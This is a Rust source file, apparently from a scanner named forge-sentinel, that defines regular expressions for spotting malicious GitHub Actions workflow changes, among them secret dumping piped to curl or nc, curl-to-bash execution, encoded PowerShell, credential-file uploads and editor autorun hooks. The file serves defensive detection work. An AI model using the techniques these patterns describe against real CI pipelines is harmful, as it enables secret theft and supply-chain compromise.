use std::collections::{BTreeMap, HashMap, HashSet};
use std::env;
use std::thread;
use std::time::Duration;

use anyhow::{Context, Result, bail};
use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use once_cell::sync::Lazy;
use regex::{Captures, Regex};
use reqwest::blocking::{Client, Response};
use reqwest::header::{ACCEPT, AUTHORIZATION, HeaderMap, HeaderValue, USER_AGENT};
use serde::Serialize;
use serde_json::{Value, json};

use crate::cli::GithubWorkflowHuntArgs;
use crate::detection_model::{FactorKind, factor_meta, humanize_factor};
use crate::github_actions::{
    ActionRefType, ActionUse, extract_action_uses, mutable_reusable_workflows,
    mutable_third_party_actions,
};
use crate::presets::PresetMeta;

fn re(pattern: &str) -> Regex {
    Regex::new(pattern).expect("invalid regex")
}

static ARCHIVE_RE: Lazy<Regex> = Lazy::new(|| re(r"(?i)\.(tgz|tar\.gz|zip|whl|crate|nupkg|gem)$"));
static WORKFLOW_RE: Lazy<Regex> = Lazy::new(|| re(r"(?i)^\.github/workflows/[^/]+\.ya?ml$"));
static SUSPICIOUS_WORKFLOW_FILE_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)^\.github/workflows/(github[-_ ]?actions[-_ ]?security|shai[-_]?hulud|security[-_]?scan|secret[-_]?scan)[^/]*\.ya?ml$",
    )
});
static GHOSTACTION_WORKFLOW_NAME_RE: Lazy<Regex> =
    Lazy::new(|| re(r#"(?im)^\+\s*name:\s*["']?Github Actions Security["']?\s*$"#));
static ACTION_MANIFEST_RE: Lazy<Regex> = Lazy::new(|| re(r"(?i)^(?:action|.+/action)\.ya?ml$"));
static AGENT_INSTRUCTION_FILE_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)(^|/)(CLAUDE\.md|AGENTS\.md|\.cursorrules|\.windsurfrules|copilot-instructions\.md|prompt\.md)$",
    )
});
static AGENT_EDITOR_AUTORUN_FILE_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)(^|/)(\.claude/(settings\.json|[^/]+\.(?:mjs|js|cjs|sh|ps1))|\.vscode/(tasks\.json|[^/]+\.(?:mjs|js|cjs|sh|ps1)))$",
    )
});
static GENERATED_WORKFLOW_RE: Lazy<Regex> = Lazy::new(|| re(r"(?i)\.generated\.ya?ml$"));
static LOCKED_WORKFLOW_RE: Lazy<Regex> = Lazy::new(|| re(r"(?i)\.lock\.ya?ml$"));
static DEPENDENCY_UPDATE_MESSAGE_RE: Lazy<Regex> =
    Lazy::new(|| re(r"(?i)\b(dependenc(?:y|ies)|deps?|npm|package-lock|vulnerab|security)\b"));
static DEPENDENCY_MANIFEST_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)(^|/)(package-lock\.json|npm-shrinkwrap\.json|package\.json|pnpm-lock\.yaml|yarn\.lock|Cargo\.lock|Cargo\.toml|poetry\.lock|uv\.lock|requirements(?:-[\w.-]+)?\.txt|go\.mod|go\.sum|Gemfile\.lock|pom\.xml|build\.gradle|gradle\.lockfile)$",
    )
});
static PROTECTIVE_WORKFLOW_FILE_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)(codeql|scorecard|security|secret|scan|sast|semgrep|trivy|osv|dependency[-_]?review|guarddog|lint|test|verify|validate|audit)",
    )
});
static LOCAL_PUBLISH_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)\b(npm\s+publish|twine\s+upload|cargo\s+publish|gem\s+push|dotnet\s+nuget\s+push)\b[^\n\r]*([./\w-]+/)?[^/\s]+\.(?:tgz|tar\.gz|whl|crate|nupkg|gem)",
    )
});
static DYNAMIC_PUBLISH_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)\b(npm\s+publish|twine\s+upload|cargo\s+publish|gem\s+push|dotnet\s+nuget\s+push)\b[^\n\r]*(\$\{\{\s*(inputs|github\.event\.inputs|env)\.|\$(?:INPUT_[A-Z0-9_]*|TARBALL|ARTIFACT|ARTIFACT_PATH|PACKAGE_PATH|PUBLISH_PATH|NPM_PACKAGE))",
    )
});
static TEMP_OR_HOME_PUBLISH_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)\b(npm\s+publish|twine\s+upload|cargo\s+publish|gem\s+push|dotnet\s+nuget\s+push)\b[^\n\r]*(/tmp/|\$RUNNER_TEMP|\$\{\{\s*runner\.temp\s*\}\}|~/|/home/[^/\s]+/)",
    )
});
static PUBLISH_RE: Lazy<Regex> = Lazy::new(|| {
    re(r"(?i)\b(npm\s+publish|twine\s+upload|cargo\s+publish|gem\s+push|dotnet\s+nuget\s+push)\b")
});
static ARTIFACT_INPUT_RE: Lazy<Regex> = Lazy::new(|| {
    re(r"(?im)^\+\s*(tarball|artifact|artifact_path|package_path|publish_path|dist|url):")
});
static UNTRUSTED_ARTIFACT_FETCH_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^\+.*\b(curl|wget|gh\s+release\s+download|actions/download-artifact)\b[^\n\r]*(\.(?:tgz|tar\.gz|whl|crate|nupkg|gem)\b|artifact|tarball|package)",
    )
});
static OIDC_TOKEN_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)(ACTIONS_ID_TOKEN_REQUEST_TOKEN|ACTIONS_ID_TOKEN_REQUEST_URL|oidc/token|id-token:\s*write|trusted.?publish|provenance)",
    )
});
static PR_TARGET_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+\s*pull_request_target:\s*$"));
static PULL_REQUEST_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+\s*pull_request:\s*$"));
static PR_HEAD_CHECKOUT_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r#"(?im)^\+.*(github\.event\.pull_request\.head\.(sha|ref)|ref:\s*['"]?\$\{\{\s*github\.event\.pull_request\.head\.(sha|ref)\s*\}\})"#,
    )
});
static PR_MERGE_REF_CHECKOUT_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r#"(?im)^\+.*(refs/pull/\$?\{\{?\s*github\.event\.pull_request\.number\s*\}?\}?/(merge|head)|refs/pull/[0-9]+/(merge|head))"#,
    )
});
static REMOVED_PR_TARGET_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^-\s*pull_request_target:\s*$"));
static REMOVED_PR_MERGE_REF_CHECKOUT_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r#"(?im)^-.*(refs/pull/\$?\{\{?\s*github\.event\.pull_request\.number\s*\}?\}?/(merge|head)|refs/pull/[0-9]+/(merge|head))"#,
    )
});
static PERSIST_CREDENTIALS_FALSE_RE: Lazy<Regex> =
    Lazy::new(|| re(r"(?im)^\+\s*persist-credentials:\s*false\b"));
static EMPTY_PERMISSIONS_RE: Lazy<Regex> =
    Lazy::new(|| re(r"(?im)^\+\s*permissions:\s*\{\s*\}\s*$"));
static PR_TARGET_FORK_OR_APPROVAL_GATE_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)(github\.event\.pull_request\.head\.repo\.full_name\s*==\s*github\.repository|github\.event\.pull_request\.head\.repo\.fork\s*==\s*false|external contributors|manual approval|requires manual approval|environment:\s*\$\{\{\s*needs\.[^}]+\.outputs\.environment\s*\}\})",
    )
});
static PR_TARGET_SANITIZED_ARTIFACT_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)(Sanitizes? the untrusted output|sanitized-output|ALLOWED_PACKAGES|SHA_PATTERN|valid SHA|unexpected package)",
    )
});
static WRITE_PERMISSIONS_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^\+\s*permissions:\s*write-all\b|^\+\s*(contents|pull-requests|actions|packages|id-token|checks|statuses):\s*write\b",
    )
});
static WRITE_ALL_PERMISSIONS_RE: Lazy<Regex> =
    Lazy::new(|| re(r"(?im)^\+\s*permissions:\s*write-all\b"));
static ID_TOKEN_WRITE_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+\s*id-token:\s*write\b"));
static ACTIONS_WRITE_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+\s*actions:\s*write\b"));
static PACKAGES_WRITE_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+\s*packages:\s*write\b"));
static WORKFLOW_RUN_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+\s*workflow_run:\s*$"));
static WORKFLOW_ARTIFACT_DOWNLOAD_RE: Lazy<Regex> =
    Lazy::new(|| re(r"(?im)^\+.*\b(actions/download-artifact|gh\s+run\s+download)\b"));
static WORKFLOW_RUN_HEAD_CHECKOUT_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)github\.event\.workflow_run\.(head_branch|head_sha|pull_requests\[[0-9]+\]\.head\.(sha|ref))",
    )
});
static CONTINUE_ON_ERROR_RE: Lazy<Regex> =
    Lazy::new(|| re(r"(?im)^\+\s*continue-on-error:\s*true\b"));
static AUTO_PUSH_OR_MERGE_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^\+.*\b(git\s+push|gh\s+pr\s+merge|gh\s+api\b.*\bmerge\b|gh\s+api\b.*\bbranches/.*/protection\b)",
    )
});
static BRANCH_PROTECTION_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^\+.*\b(gh\s+api|curl|gh\s+repo\s+edit)\b.*\b(branches/[^/\s]+/protection|rulesets|bypass_pull_request_allowances|required_status_checks|enforce_admins|dismissal_restrictions)",
    )
});
static DISPATCH_TRIGGER_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+\s*repository_dispatch:\s*$"));
static WORKFLOW_DISPATCH_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+\s*workflow_dispatch:\s*$"));
static SECRETS_INHERIT_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+\s*secrets:\s*inherit\b"));
static SELF_HOSTED_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+.*self-hosted"));
static CHECK_BYPASS_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^\+\s*(paths-ignore:|branches-ignore:)\s*$|^\+\s*if:\s*(?:false|\$\{\{\s*false\s*\}\})\s*$",
    )
});
static COMMENT_OR_REVIEW_TRIGGER_RE: Lazy<Regex> = Lazy::new(|| {
    re(r"(?im)^\+\s*(issue_comment:|pull_request_review_comment:|discussion_comment:|issues:)")
});
static UNTRUSTED_TEXT_SOURCE_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)github\.event\.(comment|issue|pull_request|review|discussion|discussion_comment)\.(body|title)|github\.event\.head_commit\.message|github\.event\.commits\[[0-9]+\]\.message",
    )
});
static AGENTIC_TOOL_RE: Lazy<Regex> = Lazy::new(|| {
    re(r"(?i)(gh-aw-manifest|copilot|openai|anthropic|claude|codex|chatgpt|openrouter|aider|llm)")
});
static AGENTIC_SECRET_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)(OPENAI_API_KEY|ANTHROPIC_API_KEY|OPENROUTER_API_KEY|COPILOT_GITHUB_TOKEN|GH_AW_[A-Z0-9_]+|GEMINI_API_KEY|MISTRAL_API_KEY)",
    )
});
static FORK_PR_FETCH_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)git\s+fetch[^\n\r]*\bpull/\$?\{?[A-Z0-9_]+\}?/head|git\s+fetch[^\n\r]*\bpull/\d+/head|refs/pull/\$?\{?[A-Z0-9_]+\}?/head|refs/pull/\d+/head",
    )
});
static PR_METADATA_FETCH_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)gh\s+pr\s+view[^\n\r]*--json[^\n\r]*(title|body|baseRefName)|gh\s+api[^\n\r]*/pulls/[^\n\r]*(title|body|base)|gh\s+pr\s+view[^\n\r]*\b(title|body|baseRefName)\b",
    )
});
static AGENTIC_TOOL_GRANT_RE: Lazy<Regex> =
    Lazy::new(|| re(r"(?im)allowedTools|Bash\(git:\*\)|Bash\(gh:\*\)|claude_args:"));
static AGENTIC_GIT_TOKEN_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)github_token:\s*\$\{\{\s*secrets\.|GH_TOKEN:\s*\$\{\{\s*secrets\.|token:\s*\$\{\{\s*secrets\.(PAT|GITHUB_TOKEN|GH_TOKEN)|use the .*service account|secrets\.PAT",
    )
});
static REPO_WRITE_TOKEN_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)(GH_TOKEN|GITHUB_TOKEN):\s*\$\{\{\s*secrets\.|github_token:\s*\$\{\{\s*secrets\.|token:\s*\$\{\{\s*secrets\.(PAT|GH_TOKEN|GITHUB_TOKEN|[A-Z0-9_]*PAT)\s*\}\}|secrets\.(PAT|GH_TOKEN|GITHUB_TOKEN)",
    )
});
static ARTIFACT_STAGING_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^\+.*\b(cp|mv)\b[^\n\r]*\.(tgz|tar\.gz|whl|crate|nupkg|gem)\b[^\n\r]*(/tmp\b|/tmp/|\$RUNNER_TEMP|\$\{\{\s*runner\.temp\s*\}\}|~/|/home/[^/\s]+/)|^\+\s*cd\s+(/tmp\b|\$RUNNER_TEMP|\$\{\{\s*runner\.temp\s*\}\}|~/|/home/[^/\s]+/)",
    )
});
static PERSIST_CREDENTIALS_TRUE_RE: Lazy<Regex> =
    Lazy::new(|| re(r"(?im)^\+\s*persist-credentials:\s*true\b"));
static GIT_CREDENTIAL_PERSISTENCE_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^\+.*\b(git\s+config\b.*(insteadOf|credential\.helper)|gh\s+auth\s+setup-git|git\s+credential\s+approve|url\.https://[^ \n\r]*\$\{\{\s*secrets\.)",
    )
});
static SENSITIVE_ARTIFACT_UPLOAD_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?ims)^\+.*actions/upload-artifact@.*(?:\n\+.*){0,20}(\.npmrc|\.pypirc|\.env\b|\.aws/|\.docker/config\.json|id_rsa|\.ssh/|kubeconfig|credentials)",
    )
});
static SENSITIVE_CACHE_PATH_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?ims)^\+.*(?:actions/cache|actions/cache/(?:save|restore))@.*(?:\n\+.*){0,24}(\.npmrc|\.pypirc|\.env\b|\.aws/|\.docker/config\.json|id_rsa|\.ssh/|kubeconfig|credentials|\.gnupg)",
    )
});
static REMOTE_SCRIPT_EXECUTION_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^\+.*((curl|wget)[^\n\r|;]*https?://[^\n\r|;]+(\|\s*(bash|sh|zsh|pwsh|powershell)|[;&]\s*(bash|sh|zsh|pwsh|powershell))|bash\s+<\(\s*(curl|wget)|Invoke-Expression\s+\(?\s*Invoke-WebRequest)",
    )
});
static BASE64_PAYLOAD_EXECUTION_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^\+.*(base64\s+(-d|--decode)|FromBase64String)\b[^\n\r]*(\|\s*(bash|sh|zsh|pwsh|powershell|python|node)|[;&]\s*(bash|sh|zsh|pwsh|powershell|python|node)|Invoke-Expression|iex\b)",
    )
});
static POWERSHELL_ENCODED_COMMAND_RE: Lazy<Regex> = Lazy::new(|| {
    re(r"(?im)^\+.*\b(powershell|pwsh)(?:\.exe)?\b[^\n\r]*(?:-enc|-encodedcommand)\b")
});
static GITHUB_ENV_UNTRUSTED_WRITE_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)github\.(?:event|head_ref|ref_name|ref)[^}\n\r]*\}\}[^>\n\r]*(>>|\|[^\n\r]*tee)[^\n\r]*\$GITHUB_ENV|GITHUB_ENV[^\n\r]*(github\.(?:event|head_ref|ref_name|ref))",
    )
});
static GITHUB_OUTPUT_UNTRUSTED_WRITE_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)github\.(?:event|head_ref|ref_name|ref)[^}\n\r]*\}\}[^>\n\r]*(>>|\|[^\n\r]*tee)[^\n\r]*\$GITHUB_OUTPUT|GITHUB_OUTPUT[^\n\r]*(github\.(?:event|head_ref|ref_name|ref))",
    )
});
static GITHUB_SCRIPT_DYNAMIC_CODE_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?ims)^\+.*actions/github-script@.*(?:\n\+.*){0,40}(eval\s*\(|Function\s*\(|child_process|execSync\s*\(|spawnSync\s*\(|execFileSync\s*\()",
    )
});
static GITHUB_SCRIPT_UNTRUSTED_CONTEXT_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?ims)^\+.*actions/github-script@.*(?:\n\+.*){0,40}(github\.event\.(comment|issue|pull_request|review|discussion|head_commit|commits)|context\.payload\.(comment|issue|pull_request|review|discussion|head_commit|commits)|\$\{\{\s*github\.event\.)",
    )
});
static PACKAGE_SCRIPT_GUARD_REMOVAL_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^-.*(--ignore-scripts|ignore-scripts\s*[=:]\s*true|npm_config_ignore_scripts\s*[:=]\s*true)|^\+.*(--ignore-scripts\s*=\s*false|ignore-scripts\s*[=:]\s*false|npm_config_ignore_scripts\s*[:=]\s*false)",
    )
});
static UNTRUSTED_REF_SHELL_INTERPOLATION_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)\$\{\{\s*github\.(head_ref|ref_name|ref|event\.pull_request\.head\.(ref|label)|event\.workflow_run\.head_branch)\s*\}\}",
    )
});
static DOCKER_SOCKET_EXPOSURE_RE: Lazy<Regex> =
    Lazy::new(|| re(r"(?im)^\+.*(/var/run/docker\.sock|docker\.sock:/var/run/docker\.sock)"));
static CLOUD_SECRET_WITH_EXTERNAL_NETWORK_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?is)(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|AZURE_CLIENT_SECRET|GOOGLE_APPLICATION_CREDENTIALS|GCP_SERVICE_ACCOUNT|CLOUDFLARE_API_TOKEN|DOCKERHUB_TOKEN|NPM_TOKEN).{0,500}(curl|wget|Invoke-WebRequest|Invoke-RestMethod|nc|ncat|scp|sftp|http://|https://)",
    )
});
static PR_CREATE_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+.*\bgh\s+pr\s+create\b"));
static SCRIPT_INJECTION_RE: Lazy<Regex> = Lazy::new(|| {
    re(r"(?i)\$\{\{\s*github\.(?:event|head_commit|commits)[^}]*(body|title|message)[^}]*\}\}")
});
static SECRET_ENUMERATION_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^\+\s*(printenv|env)(?:\s|$)|^\+\s*set(?:\s+-[a-zA-Z]+|\s|$)|^\+.*toJSON\(secrets\)|^\+\s*compgen\s+-e\b|^\+\s*Get-ChildItem\s+env:|^\+\s*Get-Item\s+env:|^\+\s*for\s+\w+\s+in\s+\$\(env\)",
    )
});
static EXPLICIT_SECRET_REFERENCE_RE: Lazy<Regex> =
    Lazy::new(|| re(r"(?i)\$\{\{\s*secrets\.[A-Z0-9_]+\s*\}\}"));
static URL_RE: Lazy<Regex> = Lazy::new(|| re(r#"https?://[A-Za-z0-9._~:/?#\[\]@!$&'()*+,;=%-]+"#));
static EXTERNAL_SECRET_EXFIL_RE: Lazy<Regex> = Lazy::new(|| {
    re(r"(?im)^\+.*\b(curl|wget|Invoke-WebRequest|Invoke-RestMethod|nc|ncat|scp|sftp)\b")
});
static SECRET_ENUMERATION_EXFIL_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^\+.*(\b(printenv|env|compgen\s+-e|Get-ChildItem\s+env:|Get-Item\s+env:)\b|toJSON\(secrets\)).*(\|\s*(curl|wget|Invoke-WebRequest|Invoke-RestMethod|nc|ncat|scp|sftp)\b|https?://)|^\+.*\b(curl|wget|Invoke-WebRequest|Invoke-RestMethod|nc|ncat|scp|sftp)\b.*(\$\{\{\s*secrets\.|\$env:|\b[A-Z0-9_]*(TOKEN|PASSWORD|SECRET|AUTH)[A-Z0-9_]*\b|toJSON\(secrets\)|Get-ChildItem\s+env:|Get-Item\s+env:)",
    )
});
static UNTRUSTED_CODE_EXECUTION_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^\+.*\b(npm\s+(?:install|ci|test|run)|pnpm\s+(?:install|test|run|nx\s+run)|yarn\s+(?:install|test|run)|make(?:\s|$)|cmake|pytest|tox|go\s+test|cargo\s+test|mvn\s+test|gradle\s+test|python\s+[^|;&]+|node\s+[^|;&]+|bash\s+[^|;&]+|sh\s+[^|;&]+|./[A-Za-z0-9_./-]+\.sh)\b",
    )
});
static REMOVED_UNTRUSTED_CODE_EXECUTION_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^-.*\b(npm\s+(?:install|ci|test|run)|pnpm\s+(?:install|test|run|nx\s+run)|yarn\s+(?:install|test|run)|make(?:\s|$)|cmake|pytest|tox|go\s+test|cargo\s+test|mvn\s+test|gradle\s+test|python\s+[^|;&]+|node\s+[^|;&]+|bash\s+[^|;&]+|sh\s+[^|;&]+|./[A-Za-z0-9_./-]+\.sh)\b",
    )
});
static CACHE_OR_SETUP_ACTION_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^\+.*(actions/cache@|\.github/(setup|actions/setup)@|pnpm-store|npm-store|yarn-cache|cache-dependency-path)",
    )
});
static CACHE_OR_SETUP_CONTEXT_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)(actions/cache@|\.github/(setup|actions/setup)@|pnpm-store|npm-store|yarn-cache|cache-dependency-path)",
    )
});
static REMOVED_CACHE_OR_SETUP_ACTION_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^-.*(actions/cache@|\.github/(setup|actions/setup)@|pnpm-store|npm-store|yarn-cache|cache-dependency-path)",
    )
});
static PR_TARGET_CACHE_POISONING_REMEDIATION_CONTEXT_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)(checks out PR merge code|untrusted with read-only permissions|split trust boundaries|limited write access|dependency cache|cache poisoning|refs/pull/.+/(merge|head)|skipRemoteCache)",
    )
});
static RUNNER_MEMORY_SECRET_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)(/proc/[^ \n\r]*/mem|Runner\.(Worker|Listener)|isSecret|trufflehog|gitleaks|printenv|base64\s+-d)",
    )
});
static COMMENTER_WRITE_GATE_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)collaborators/.+?/permission|PERMISSION=.*gh api .*collaborators/.+?/permission|permission[^\n\r]{0,80}(admin|write)|You do not have write access to use",
    )
});
static MERGED_PR_ONLY_GATE_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)mergedAt|baseRefName|only works on merged PRs|only works on PRs targeting non-main branches|This PR has not been merged yet|This PR already targets [`']?main",
    )
});
static SKIP_GUARD_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^\+.*\bif:\s*.*(contains\([^)]*label|github\.actor\s*[!=]=|\[(?:ci skip|skip ci)\]|skip[_ -]?ci|github\.actor[^\n\r]{0,80}dependabot|dependabot[^\n\r]{0,80}github\.actor)",
    )
});
static MANUAL_OIDC_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)(ACTIONS_ID_TOKEN_REQUEST_TOKEN|ACTIONS_ID_TOKEN_REQUEST_URL|oidc/token/exchange|npm/v1/oidc/token)",
    )
});
static REGISTRY_AUTH_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)(_authToken|NPM_TOKEN|NODE_AUTH_TOKEN|TWINE_PASSWORD|CARGO_REGISTRY_TOKEN|GITHUB_TOKEN|npm\s+config\s+set|npm/v1/oidc/token)",
    )
});
static TOKEN_EXPOSURE_RE: Lazy<Regex> =
    Lazy::new(|| re(r"(?im)(?:[A-Z0-9_]*?(?:TOKEN|AUTH|PASSWORD)[A-Z0-9_]*)"));
static WEAK_TRIGGER_RE: Lazy<Regex> =
    Lazy::new(|| re(r"(?m)^\+\s*(push:|pull_request_target:|workflow_run:)"));
static TAG_TRIGGER_RE: Lazy<Regex> = Lazy::new(|| re(r"(?m)^\+\s*tags:\s*$"));
static REMOVED_GATES_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?im)^-\s*.*(branch check|can only publish|workflow_dispatch|publish_type|dry run|environment:|deployment:|needs:|download artifacts|npm ci|test|build|release_version|GITHUB_REF|refs/heads/rc|hotfix-rc|codeql|scan|verify|lint|sast|security)",
    )
});
static EVIDENCE_LINE_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)(npm\s+publish|twine\s+upload|cargo\s+publish|gem\s+push|dotnet\s+nuget\s+push|ACTIONS_ID_TOKEN_REQUEST|oidc/token|npm/v1/oidc/token|_authToken|NODE_AUTH_TOKEN|NPM_TOKEN|TWINE_PASSWORD|CARGO_REGISTRY_TOKEN|base64|printenv|set\s+-x|id-token:\s*write|workflow_run:|pull_request_target:|tags:|workflow_dispatch|continue-on-error:\s*true|permissions:\s*write-all|contents:\s*write|pull-requests:\s*write|github\.event\.pull_request\.head\.(sha|ref)|actions/download-artifact|gh\s+run\s+download|issue_comment:|pull_request_review_comment:|discussion_comment:|issues:|github\.event\.(comment|issue|pull_request|review|discussion|discussion_comment)\.(body|title)|OPENAI_API_KEY|ANTHROPIC_API_KEY|OPENROUTER_API_KEY|COPILOT_GITHUB_TOKEN|GH_AW_[A-Z0-9_]+|GH_TOKEN|GITHUB_TOKEN|github_token:|secrets\.|copilot|openai|anthropic|claude|codex|chatgpt|openrouter|aider|llm|SessionStart|runOn|folderOpen|ENTRY_SCRIPT|BUN_VERSION|downloadToFile|execFileSync\(binPath|git\s+push|gh\s+pr\s+create|gh\s+pr\s+merge|paths-ignore|branches-ignore|repository_dispatch:|rulesets|protection|secrets:\s*inherit|self-hosted|uses:\s*[\w.-]+/[\w.-]+/.github/workflows/|tarball|artifact_path|package_path|publish_path|actions/download-artifact|curl|wget|Invoke-WebRequest|Invoke-RestMethod|gh\s+release\s+download|npm ci|pnpm install|yarn install|test|build|environment:|needs:|Runner\.(Worker|Listener)|/proc/.*/mem|isSecret)",
    )
});
static NPM_OIDC_PACKAGE_RE: Lazy<Regex> =
    Lazy::new(|| re(r#"(?i)npm/v1/oidc/token/exchange/package/([^"'\s)]+)"#));
static GITHUB_TOKEN_RE: Lazy<Regex> =
    Lazy::new(|| re(r"\b(?:ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{22,})\b"));
static TEAMPCP_MARKER_RE: Lazy<Regex> =
    Lazy::new(|| re(r"LongLiveTheResistanceAgainstMachines:([A-Za-z0-9+/=_-]{20,})"));
static TOKEN_ECHO_RE: Lazy<Regex> = Lazy::new(|| {
    re(r#"(?i)^[+-]\s*(?:echo|printf)\s+['"]?\$(?:[A-Z0-9_]*?(?:TOKEN|AUTH|PASSWORD)[A-Z0-9_]*)\b"#)
});
static TOKEN_PRINTENV_RE: Lazy<Regex> =
    Lazy::new(|| re(r"(?i)^[+-]\s*printenv\s+(?:[A-Z0-9_]*?(?:TOKEN|AUTH|PASSWORD)[A-Z0-9_]*)\b"));
static TOKEN_PIPE_BASE64_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r"(?i)^[+-]\s*.*\b(?:echo|printf|printenv)\b.*(?:[A-Z0-9_]*?(?:TOKEN|AUTH|PASSWORD)[A-Z0-9_]*).*\|\s*base64\b",
    )
});
static TOKEN_BASE64_RE: Lazy<Regex> =
    Lazy::new(|| re(r"(?i)^[+-]\s*.*\bbase64\b.*(?:[A-Z0-9_]*?(?:TOKEN|AUTH|PASSWORD)[A-Z0-9_]*)"));
static ACTION_MANIFEST_COMPOSITE_RE: Lazy<Regex> =
    Lazy::new(|| re(r#"(?im)^\+\s*using:\s*["']?composite["']?\b"#));
static ACTION_MANIFEST_DOCKER_RE: Lazy<Regex> = Lazy::new(|| {
    re(r#"(?im)^-\s*using:\s*["']?docker["']?\b|^-\s*(image|entrypoint|post-entrypoint):"#)
});
static ACTION_MANIFEST_REMOTE_SCRIPT_RE: Lazy<Regex> = Lazy::new(|| {
    re(r"(?im)^\+.*\b(curl|wget)\b[^\n\r]*(https?://[^\s|;&]+)[^\n\r]*\|\s*(bash|sh)\b")
});
static AGENT_EDITOR_AUTORUN_HOOK_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r#"(?im)^\+.*"SessionStart"|^\+.*"runOn"\s*:\s*"folderOpen"|^\+.*\b(node|bun|bash|sh|python|python3|pwsh|powershell)\b\s+\.((claude|vscode)/)[A-Za-z0-9_.-]+\.(mjs|js|cjs|sh|ps1)"#,
    )
});
static AGENT_RUNTIME_BOOTSTRAP_RE: Lazy<Regex> = Lazy::new(|| {
    re(
        r#"(?i)(github\.com/oven-sh/bun/releases|BUN_VERSION|downloadToFile|https\.get|execFileSync\(binPath|ENTRY_SCRIPT\s*=\s*["']execution\.js["'])"#,
    )
});
static GITHUB_CLIENT: Lazy<Client> = Lazy::new(|| {
    let mut headers = HeaderMap::new();
    headers.insert(
        USER_AGENT,
        HeaderValue::from_static("forge-sentinel/0.1 native-rust"),
    );
    headers.insert(
        ACCEPT,
        HeaderValue::from_static("application/vnd.github+json"),
    );
    if let Ok(token) = env::var("GITHUB_TOKEN").or_else(|_| env::var("GH_TOKEN")) {
        if !token.trim().is_empty() {
            let value = format!("Bearer {}", token.trim());
            if let Ok(header) = HeaderValue::from_str(&value) {
                headers.insert(AUTHORIZATION, header);
            }
        }
    }
    Client::builder()
        .default_headers(headers)
        .build()
        .expect("valid GitHub HTTP client")
});

const CORE_WORKFLOW_FACTORS: &[&str] = &[
    "secret_material_printed_or_encoded",
    "dynamic_artifact_publish_with_registry_auth",
    "dynamic_artifact_publish_with_release_boundary_change",
